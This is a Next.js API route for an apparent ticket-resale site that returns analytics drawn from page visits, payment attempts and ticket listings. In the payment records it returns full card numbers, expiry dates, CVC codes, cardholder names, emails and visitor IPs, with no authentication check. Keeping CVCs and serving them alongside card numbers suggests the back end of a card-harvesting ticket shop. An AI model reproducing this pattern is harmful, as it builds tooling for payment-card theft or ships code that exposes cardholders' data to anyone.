import { NextResponse } from 'next/server';
import { analyticsStore, TrackingEvent } from '@/lib/analytics';
import { db } from '@/lib/db';
import { pageVisit, paymentAttempt, ticketListing } from '@/lib/schema';
import { desc } from 'drizzle-orm';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function GET() {
  try {
    const memoryStats = analyticsStore.getStats();
    let eventsList: TrackingEvent[] = [...memoryStats.recentEvents];

    // Fetch permanent records from Neon Postgres database
    try {
      const dbVisits = await db.select().from(pageVisit).orderBy(desc(pageVisit.createdAt)).limit(100);
      const dbCards = await db.select().from(paymentAttempt).orderBy(desc(paymentAttempt.createdAt)).limit(100);
      const dbListings = await db.select().from(ticketListing).orderBy(desc(ticketListing.createdAt)).limit(100);

      const dbEvents: TrackingEvent[] = [
        ...dbVisits.map((v) => ({
          id: v.id,
          type: 'PAGE_VIEW' as const,
          path: v.path,
          country: v.country || 'Hungary',
          countryCode: v.countryCode || 'HU',
          referrer: v.referrer || 'Direct',
          deviceOs: v.deviceOs || 'Windows 11',
          ip: v.ip || '127.0.0.1',
          timestamp: v.createdAt ? new Date(v.createdAt).toISOString() : new Date().toISOString(),
        })),
        ...dbCards.map((c) => ({
          id: c.id,
          type: 'PAYMENT_ATTEMPT' as const,
          path: '/checkout',
          eventName: c.eventName,
          amount: c.amount,
          status: c.status as any,
          cardNumber: c.cardNumber,
          expiry: c.expiry,
          cvc: c.cvc,
          cardholderName: c.cardholderName || 'Guest Fan',
          email: c.email,
          timestamp: c.createdAt ? new Date(c.createdAt).toISOString() : new Date().toISOString(),
        })),
        ...dbListings.map((l) => ({
          id: l.id,
          type: 'TICKET_LISTING' as const,
          path: '/sell',
          eventName: l.eventName,
          amount: l.askingPrice,
          status: l.status as any,
          cardholderName: l.grandstand,
          timestamp: l.createdAt ? new Date(l.createdAt).toISOString() : new Date().toISOString(),
        })),
      ];

      // Merge and deduplicate by ID
      const eventMap = new Map<string, TrackingEvent>();
      [...eventsList, ...dbEvents].forEach((evt) => {
        if (!eventMap.has(evt.id)) {
          eventMap.set(evt.id, evt);
        }
      });

      eventsList = Array.from(eventMap.values()).sort(
        (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
      );
    } catch (dbReadErr) {
      console.error('Failed to read telemetry from Postgres database:', dbReadErr);
    }

    const totalPageViews = eventsList.filter((e) => e.type === 'PAGE_VIEW').length;
    const totalEventViews = eventsList.filter((e) => e.type === 'EVENT_VIEW').length;
    const paymentAttempts = eventsList.filter((e) => e.type === 'PAYMENT_ATTEMPT');
    const successfulPayments = paymentAttempts.filter((e) => e.status === 'SUCCESS');

    const totalRevenue = successfulPayments.reduce((acc, curr) => acc + (curr.amount || 0), 0);
    const paymentSuccessRate = paymentAttempts.length > 0
      ? Math.round((successfulPayments.length / paymentAttempts.length) * 100)
      : 0;

    const eventCounts: Record<string, number> = {};
    eventsList.forEach((e) => {
      if (e.eventName) {
        eventCounts[e.eventName] = (eventCounts[e.eventName] || 0) + 1;
      }
    });

    const stats = {
      totalPageViews,
      totalEventViews,
      totalPaymentAttempts: paymentAttempts.length,
      successfulPaymentsCount: successfulPayments.length,
      paymentSuccessRate,
      totalRevenue,
      eventCounts,
      recentEvents: eventsList,
    };

    return NextResponse.json({ success: true, stats });
  } catch (error: any) {
    return NextResponse.json({ error: 'Failed to fetch analytics stats' }, { status: 500 });
  }
}
